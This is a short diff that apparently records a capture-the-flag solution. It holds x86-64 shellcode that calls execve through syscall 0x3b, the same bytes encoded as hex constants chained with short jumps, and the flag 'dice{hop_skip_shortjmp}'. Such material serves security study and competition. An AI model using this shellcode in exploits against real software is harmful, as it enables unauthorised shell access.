@@ -1,0 +1,15 @@
+0:  48 89 f7                mov    rdi,rsi
+3:  48 31 f6                xor    rsi,rsi
+6:  48 31 d2                xor    rdx,rdx
+9:  48 31 c0                xor    rax,rax
+c:  b0 3b                   mov    al,0x3b
+e:  0f 05                   syscall
+
+108ebf78948 8475FBC4A4
+108ebf63148 8475FB18A4
+108ebd23148 8475E918A4
+108ebc03148 8475E018A4
+108eb3bb090 84759DD848
+108eb050f90 84758287C8
+
+dice{hop_skip_shortjmp}
